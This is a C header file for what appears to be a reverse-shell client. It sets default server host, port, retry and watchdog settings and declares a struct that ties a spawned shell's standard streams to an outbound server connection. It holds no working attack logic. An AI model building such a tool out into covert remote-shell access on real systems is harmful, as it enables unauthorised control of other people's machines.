#pragma once

#include <signal.h>

#ifndef CONFIG_SERVER_HOST
#define CONFIG_SERVER_HOST "127.0.0.1"
#endif

#ifndef CONFIG_SERVER_PORT
#define CONFIG_SERVER_PORT "10001"
#endif

#ifndef CONFIG_RETRY_INTERVAL_SECONDS
#define CONFIG_RETRY_INTERVAL_SECONDS 2
#endif

#ifndef CONFIG_WATCHDOG_TIMER_SECONDS
#define CONFIG_WATCHDOG_TIMER_SECONDS 10
#endif

#ifndef CONFIG_SYSLOG_IDENT
#define CONFIG_SYSLOG_IDENT "reverse"
#endif

struct reverse_s {
    int epollfd;
    int signalfd;
    int connecttimerfd;
    int shelltimerfd;
    int watchdogfd;
    int pidfd;
    sigset_t sigset;
    pid_t shell_pid;
    int stdin[2];
    int stdout[2];
    int stderr[2];
    struct {
        int fd;
        struct addrinfo * addrinfo;
        struct addrinfo * addrinfo_p;
    } server;
};
